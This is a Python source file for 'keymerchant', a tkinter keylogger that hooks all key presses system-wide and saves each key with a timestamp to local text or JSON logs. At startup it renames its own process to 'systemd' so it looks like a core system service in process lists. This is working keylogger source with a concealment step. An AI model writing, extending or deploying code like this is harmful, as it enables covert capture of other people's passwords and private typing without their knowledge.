import tkinter
import keyboard
import json
import setproctitle
setproctitle.setproctitle('systemd')

from tkinter import *
from tkinter import ttk
from datetime import datetime
from keymerchant_utils import Logic, GuiUtils



KBLISTEN = None
OUTPUT_STREAM = None
CURRENTLY_LISTENING = False
JSON_OUTPUT_DICT = {'INTRO': '', 'KEYSTROKES': [], 'OUTRO': ''}
LOGGING_MODE = Logic.LoggingModes.OFF

START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX = None, None, None



def handle_event(event):
    event_data = json.loads(event.to_json())
    event_data['timestamp'] = datetime.fromtimestamp(event_data['time']).strftime('%d-%m-%y %H:%M:%S.%f')[:-3]
    print(f'{event_data['name']}\t-\t{event_data['timestamp']}')
    single_log_operation(event_data)



def single_log_operation(event):
    global LOGGING_MODE, OUTPUT_STREAM

    if OUTPUT_STREAM is not None:
        if LOGGING_MODE == Logic.LoggingModes.TXT:
            OUTPUT_STREAM.write(f"{f'{event['name']:<15}' + f'{'---':<15}{event['timestamp']}\n'}")
            OUTPUT_STREAM.flush()
        elif LOGGING_MODE == Logic.LoggingModes.JSON:
            JSON_OUTPUT_DICT['KEYSTROKES'].append({'key': event['name'], 'timestamp': event['timestamp']})



def start_logging():
    global KBLISTEN, CURRENTLY_LISTENING, LOGGING_MODE, OUTPUT_STREAM, START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX
    START_BUTTON['state'], STOP_BUTTON['state'], LOGGING_MODE_BOX['state'] = tkinter.DISABLED, tkinter.NORMAL, tkinter.DISABLED

    try:
        LOGGING_MODE = Logic.LoggingModes[LOGGING_MODE_BOX.get()]
    except KeyError:
        print(f'Invalid logging mode selected: {LOGGING_MODE_BOX.get()}')

    if not CURRENTLY_LISTENING:
        if LOGGING_MODE != Logic.LoggingModes.OFF:
            start_date = datetime.now()
            filename = f'keymerchant_{start_date.strftime('%d-%m-%Y_%H%M%S')}'
            file_intro_str = f'= = = = = BEGIN KEYMERCHANT LOG - {start_date.strftime('%H:%M:%S.%f // %A, %B %d, %Y')} = = = = ='

            if LOGGING_MODE == Logic.LoggingModes.TXT:
                OUTPUT_STREAM = open(f'{filename}.txt', 'w')
                OUTPUT_STREAM.write(f'{file_intro_str}\n\n')
            elif LOGGING_MODE == Logic.LoggingModes.JSON:

                """JSON logging is NON-IMMEDIATE. The created .json file stays EMPTY
                until logging is STOPPED. Only then is the entire dictionary dumped at once
                into the file"""

                OUTPUT_STREAM = open(f'{filename}.json', 'w')
                JSON_OUTPUT_DICT['INTRO'] = file_intro_str

        KBLISTEN = keyboard.on_press(handle_event)
        CURRENTLY_LISTENING = True

    else:
        print('Already logging')



def stop_logging():
    global KBLISTEN, CURRENTLY_LISTENING, OUTPUT_STREAM, START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX
    START_BUTTON['state'], STOP_BUTTON['state'], LOGGING_MODE_BOX['state'] = tkinter.NORMAL, tkinter.DISABLED, 'readonly'

    keyboard.unhook(KBLISTEN)
    CURRENTLY_LISTENING = False

    if OUTPUT_STREAM is not None:
        outro_text = '= = = = = END KEYMERCHANT LOG = = = = ='

        if LOGGING_MODE == Logic.LoggingModes.TXT:
            OUTPUT_STREAM.write(f'\n{outro_text}')
        elif LOGGING_MODE == Logic.LoggingModes.JSON:
            JSON_OUTPUT_DICT['OUTRO'] = outro_text
            json.dump(JSON_OUTPUT_DICT, OUTPUT_STREAM, indent = 4, ensure_ascii = False)

        OUTPUT_STREAM.close()
        OUTPUT_STREAM = None



def main():
    root = Tk()
    root.title('keymerchant a0.3')
    root.geometry('250x300')
    root.resizable(width=False, height=False)
    frame = ttk.Frame(root, padding="10 10 10 10")
    frame.grid(column = 0, row = 0, sticky = (N, W, E, S))
    root.columnconfigure(0, weight = 1)
    root.rowconfigure(0, weight = 1)

    global START_BUTTON, STOP_BUTTON, LOGGING_MODE_BOX

    START_BUTTON = Button(frame, text = 'Start', command = start_logging)
    START_BUTTON.place(relx = 0.35, rely = 0.25, anchor = CENTER)

    STOP_BUTTON = Button(frame, text = 'Stop', command = stop_logging)
    STOP_BUTTON['state'] = tkinter.DISABLED
    STOP_BUTTON.place(relx = 0.65, rely = 0.25, anchor = CENTER)

    logging_modes = [mode.name for mode in Logic.LoggingModes]
    LOGGING_MODE_BOX = ttk.Combobox(frame, values = logging_modes, state = 'readonly')
    LOGGING_MODE_BOX.set(logging_modes[0])
    LOGGING_MODE_BOX.place(relx = 0.5, rely = 0.75, anchor = CENTER)

    GuiUtils.center_window(root)
    root.mainloop()



if __name__ == "__main__":
    main()